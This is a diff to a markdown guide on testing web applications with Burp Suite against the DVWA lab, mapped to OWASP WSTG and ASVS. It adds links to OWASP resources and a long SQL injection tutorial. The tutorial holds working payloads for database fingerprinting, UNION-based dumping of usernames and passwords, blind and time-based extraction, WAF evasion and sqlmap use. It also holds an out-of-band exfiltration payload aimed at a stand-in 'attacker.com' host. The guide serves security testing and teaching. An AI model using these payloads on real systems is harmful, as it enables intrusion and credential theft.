@@ -44,9 +44,18 @@ Once DVWA is up and running, log in and set the security level. DVWA's security 
 
 The **WSTG** is a comprehensive guide that covers the most important aspects of web application security testing, providing detailed tests for a variety of vulnerabilities.
 
+For the latest version of the OWASP Web Security Testing Guide (WSTG), refer to the [official OWASP WSTG repository](https://github.com/OWASP/wstg).
+
 ### OWASP Top 10
 
 The **OWASP Top 10** represents the most critical security risks to web applications. We’ll cover how each vulnerability is tested using the WSTG methodology and map them to relevant **OWASP ASVS** levels.
+
+_Latest Versions of OWASP Top 10 and OWASP ASVS_
+
+To ensure you are working with the most up-to-date resources, refer to the latest versions of the OWASP Top 10 and OWASP ASVS:
+
+- **OWASP Top 10**: The latest version of the OWASP Top 10 can be found on the [official OWASP Top 10 page](https://owasp.org/www-project-top-ten/).
+- **OWASP ASVS**: The most recent version of the OWASP Application Security Verification Standard (ASVS) is available on the [official OWASP ASVS page](https://owasp.org/www-project-application-security-verification-standard/).
 
 ---
 
@@ -64,13 +73,367 @@ Injection flaws, such as **SQL Injection**, allow attackers to send untrusted da
 
 **Testing for SQL Injection with Burp Suite**:
 
-1. **Intercept a request** containing input parameters (e.g., form fields or URL parameters).
-2. **Send the request to Intruder** in Burp Suite.
-3. **Set the payload positions** for the input fields and apply SQL Injection payloads, such as:
+### **Identifying Database Types via SQL Injection (Using Burp Suite)**  
 
-   * `' OR '1'='1`
-   * `1'--`
-4. **Start the attack** and review the response. A successful SQL Injection will reveal errors or abnormal behavior in the server’s response.
+When testing for SQL injection, determining the underlying database is crucial for crafting precise payloads. Below are **Burp Suite-centric techniques** to fingerprint databases during testing.  
+
+---
+
+## **1. Using Error Messages (Passive Fingerprinting)**  
+**Burp Steps:**  
+1. **Intercept** a vulnerable request (e.g., `GET /user?id=1`).  
+2. **Send to Repeater** (`Ctrl+R`).  
+3. **Modify parameter** to trigger SQL errors:  
+
+<table>
+   <thead>
+      <tr>
+         <th>Database</th>
+         <th>Payload</th>
+         <th>Error Characteristics (Check HTTP Response)</th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><strong>MySQL</strong></td>
+         <td><code>id=1'</code></td>
+         <td>- <code>You have an error in your SQL syntax...</code></td>
+      </tr>
+      <tr>
+         <td><strong>PostgreSQL</strong></td>
+         <td><code>id=1'</code></td>
+         <td>- <code>PG::SyntaxError: ERROR: unterminated quoted string</code></td>
+      </tr>
+      <tr>
+         <td><strong>Oracle</strong></td>
+         <td><code>id=1'</code></td>
+         <td>- <code>ORA-01756: quoted string not properly terminated</code></td>
+      </tr>
+      <tr>
+         <td><strong>SQL Server</strong></td>
+         <td><code>id=1'</code></td>
+         <td>- <code>Unclosed quotation mark after the character string</code></td>
+      </tr>
+   </tbody>
+</table>
+
+
+**Burp Tip:** Use **"Match and Replace"** (`Proxy > Options`) to highlight errors automatically.  
+
+---
+
+## **2. Using Time-Based Payloads (Active Fingerprinting)**  
+**Burp Steps:**  
+1. **Send request to Intruder** (`Ctrl+I`).  
+2. **Use Sniper mode**, target the vulnerable parameter.  
+3. **Test delay-based payloads:**  
+
+<table>
+   <thead>
+      <tr>
+         <th>Database</th>
+         <th>Payload</th>
+         <th>Expected Delay</th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><strong>MySQL</strong></td>
+         <td><code>1' AND SLEEP(5)-- -</code></td>
+         <td>~5 seconds</td>
+      </tr>
+      <tr>
+         <td><strong>PostgreSQL</strong></td>
+         <td><code>1' AND pg_sleep(5)-- -</code></td>
+         <td>~5 seconds</td>
+      </tr>
+      <tr>
+         <td><strong>Oracle</strong></td>
+         <td><code>1' AND (SELECT COUNT(*) FROM ALL_USERS WHERE username='a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5))='a'</code></td>
+         <td>~5 seconds</td>
+      </tr>
+      <tr>
+         <td><strong>SQL Server</strong></td>
+         <td><code>1' WAITFOR DELAY '0:0:5'-- -</code></td>
+         <td>~5 seconds</td>
+      </tr>
+   </tbody>
+</table>
+
+**Burp Tip:** Use **"Response Times"** in Intruder to detect delays.  
+
+---
+
+## **3. Using Version Detection Queries**  
+**Burp Steps:**  
+1. **Craft UNION-based or stacked queries** in Repeater.  
+2. **Extract version info:**  
+
+
+<table>
+   <thead>
+      <tr>
+         <th>Database</th>
+         <th>Payload (Repeater)</th>
+         <th>Expected Output</th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><strong>MySQL</strong></td>
+         <td><code>1' UNION SELECT 1,@@version,3-- -</code></td>
+         <td><code>10.5.8-MariaDB</code></td>
+      </tr>
+      <tr>
+         <td><strong>PostgreSQL</strong></td>
+         <td><code>1' UNION SELECT 1,version(),3-- -</code></td>
+         <td><code>PostgreSQL 14.2...</code></td>
+      </tr>
+      <tr>
+         <td><strong>Oracle</strong></td>
+         <td><code>1' UNION SELECT 1,banner,3 FROM v$version-- -</code></td>
+         <td><code>Oracle Database 19c...</code></td>
+      </tr>
+      <tr>
+         <td><strong>SQL Server</strong></td>
+         <td><code>1' UNION SELECT 1,@@version,3-- -</code></td>
+         <td><code>Microsoft SQL Server 2019...</code></td>
+      </tr>
+   </tbody>
+</table>
+
+
+**Burp Tip:** Use **"Decoder"** to URL-encode payloads before sending.  
+
+---
+
+## **4. Using Database-Specific Functions**  
+
+<table>
+   <thead>
+      <tr>
+         <th>Database</th>
+         <th>Test Payload (Repeater)</th>
+         <th>Success Condition</th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><strong>MySQL</strong></td>
+         <td><code>id=1' AND MID('ABC',1,1)='A'-- -</code></td>
+         <td>Returns <code>ABC</code> data</td>
+      </tr>
+      <tr>
+         <td><strong>PostgreSQL</strong></td>
+         <td><code>id=1' AND SUBSTRING('ABC',1,1)='A'-- -</code></td>
+         <td>Returns <code>ABC</code> data</td>
+      </tr>
+      <tr>
+         <td><strong>Oracle</strong></td>
+         <td><code>id=1' AND SUBSTR('ABC',1,1)='A'-- -</code></td>
+         <td>Returns <code>ABC</code> data</td>
+      </tr>
+      <tr>
+         <td><strong>SQL Server</strong></td>
+         <td><code>id=1' AND SUBSTRING('ABC',1,1)='A'-- -</code></td>
+         <td>Returns <code>ABC</code> data</td>
+      </tr>
+   </tbody>
+</table>
+
+**Burp Tip:** Compare responses between valid (`'A'`) and invalid (`'X'`) payloads.  
+
+---
+
+## **5. Using Burp Collaborator for Out-of-Band (OOB) Testing**  
+If the app filters errors, use **DNS exfiltration** to leak DB type:  
+```sql
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share\\'))-- -
+```
+- **MySQL**: `10.5.8-MariaDB.attacker.com` (DNS callback)  
+- **Oracle**: `UTL_HTTP` or `UTL_INADDR` for OOB.  
+
+**Burp Steps:**  
+1. **Generate Collaborator payload** (`Burp > Burp Collaborator Client`).  
+2. **Insert into SQLi payload** (e.g., `@@version` + Collaborator domain).  
+3. **Monitor for DNS callbacks**.  
+
+---
+
+### **Key Burp Suite Features for DB Fingerprinting**  
+✔ **Repeater**: Test payloads manually.  
+✔ **Intruder**: Automate delay/error detection.  
+✔ **Collaborator**: Bypass filters via OOB.  
+✔ **Logger**: Track all responses for anomalies.  
+
+**Mapped OWASP ASVS Level**: **ASVS 3.1 (Input Validation)**
+
+### **SQL Injection Testing with Burp Suite**  
+
+This section covers **manual and automated techniques** to test for SQL injection vulnerabilities using **Burp Suite Professional/Community**.  
+
+---
+
+## **1. Setup & Configuration**  
+**Prerequisites:**  
+- Burp Suite installed (Proxy, Repeater, Intruder, Scanner).  
+- Target web application (DVWA).  
+- Browser configured to use Burp as proxy (`127.0.0.1:8080`).  
+
+**Steps:**  
+1. **Start Burp Proxy** (`Proxy > Intercept ON`).  
+2. **Browse the target application** (login forms, search fields, URL parameters).  
+3. **Capture requests** in Proxy history (`Proxy > HTTP history`).  
+
+---
+
+## **2. Manual Testing (Repeater & Scanner)**  
+
+### **A. Error-Based SQLi Detection**  
+**Objective:** Trigger SQL errors to confirm injection.  
+
+**Steps:**  
+1. **Intercept a request** (e.g., `GET /product?id=1`).  
+2. **Send to Repeater** (`Ctrl+R`).  
+3. **Test with malicious inputs:**  
+
+<table>
+   <thead>
+      <tr>
+         <th>Payload</th>
+         <th>Expected Behavior (Check Response)</th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><code>id=1'</code></td>
+         <td>SQL syntax error (MySQL: <code>You have an error...</code>)</td>
+      </tr>
+      <tr>
+         <td><code>id=1"</code></td>
+         <td>Error if app uses double quotes</td>
+      </tr>
+      <tr>
+         <td><code>id=1'-- -</code></td>
+         <td>If page loads normally, injection likely</td>
+      </tr>
+      <tr>
+         <td><code>id=1' AND 1=1-- -</code></td>
+         <td>Page loads normally (TRUE condition)</td>
+      </tr>
+      <tr>
+         <td><code>id=1' AND 1=2-- -</code></td>
+         <td>Page breaks (FALSE condition)</td>
+      </tr>
+   </tbody>
+</table>
+
+**Burp Tip:** Use **"Highlight"** in Repeater to spot differences.  
+
+---
+
+### **B. UNION-Based SQLi (Data Extraction)**  
+**Objective:** Extract DB records via `UNION SELECT`.  
+
+**Steps:**  
+1. **Find the number of columns** (using `ORDER BY`):  
+   ```sql
+   id=1' ORDER BY 1-- -  
+   id=1' ORDER BY 2-- -  
+   ...  
+   ```
+   - When `ORDER BY X` fails, columns = `X-1`.  
+
+2. **Identify vulnerable columns** (using `UNION SELECT`):  
+   ```sql
+   id=-1' UNION SELECT 1,2,3-- -
+   ```
+   - Numbers `2,3` in response? Those columns are injectable.  
+
+3. **Extract data (examples):**  
+   - **Database name:**  
+     ```sql
+     id=-1' UNION SELECT 1,database(),3-- -
+     ```
+   - **Table names:**  
+     ```sql
+     id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
+     ```
+   - **Column names:**  
+     ```sql
+     id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
+     ```
+   - **Dump credentials:**  
+     ```sql
+     id=-1' UNION SELECT 1,concat(username,':',password),3 FROM users-- -
+     ```
+
+---
+
+### **C. Blind SQLi (Boolean & Time-Based)**  
+**Objective:** Extract data without visible errors.  
+
+#### **Boolean-Based (Intruder)**  
+1. **Capture a request** (e.g., `GET /profile?id=1`).  
+2. **Send to Intruder** (`Ctrl+I`).  
+3. **Test with payloads:**  
+   ```sql
+   id=1' AND SUBSTRING(database(),1,1)='a'-- -
+   ```
+   - If `TRUE`, page loads normally.  
+   - Use **Cluster Bomb** attack to brute-force characters.  
+
+#### **Time-Based (Repeater/Intruder)**  
+1. **Test delays:**  
+   ```sql
+   id=1' AND IF(1=1,SLEEP(5),0)-- -
+   ```
+   - If response takes **5+ seconds**, injection works.  
+
+---
+
+## **3. Automated Testing (Burp Scanner & SQLmap)**  
+
+### **A. Burp Active Scanner**  
+1. **Right-click a request** > **Scan**.  
+2. **Check results** (`Dashboard > Scan queue`).  
+3. **Review SQLi findings** (`Issues` tab).  
+
+### **B. SQLmap + Burp (For Advanced Testing)**  
+1. **Save Burp request** (`Right-click > Save item`).  
+2. **Run SQLmap:**  
+   ```bash
+   sqlmap -r request.txt --batch --risk=3 --level=5
+   ```
+   - Automates UNION, error-based, blind, and OOB SQLi.  
+
+---
+
+## **4. Bypassing Filters (WAF Evasion)**  
+If the app blocks `'` or `UNION`, try:  
+- **Hex encoding:** `id=1'` → `id=0x2731`  
+- **Comment obfuscation:** `-- -` → `#` or `/*!...*/` (MySQL)  
+- **Case variation:** `UnIoN SeLeCt`  
+
+**Burp Tip:** Use **"Payload Processing"** in Intruder to auto-encode payloads.  
+
+---
+
+## **5. Reporting & Mitigation**  
+**Burp Findings:**  
+- **Vulnerable parameters** (URL, headers, body).  
+- **Extracted data** (DB name, tables, creds).  
+
+**Remediation:**  
+- Use **prepared statements** (`PDO`, `ORM`).  
+- Implement **input validation** (allowlist, not blocklist).  
+- Deploy **WAF rules** (ModSecurity, Cloudflare).  
+
+### **Key Burp Suite Features for SQL Injection Testing**  
+✔ **Repeater**: Test SQL injection payloads manually and observe responses.  
+✔ **Intruder**: Automate testing for SQL injection with payload fuzzing and response analysis.  
+✔ **Collaborator**: Perform out-of-band (OOB) SQL injection testing to detect blind vulnerabilities.  
+✔ **Logger**: Monitor and analyze all HTTP requests and responses for anomalies related to SQL injection.  
 
 **Mapped OWASP ASVS Level**: **ASVS 3.1 (Input Validation)**
 
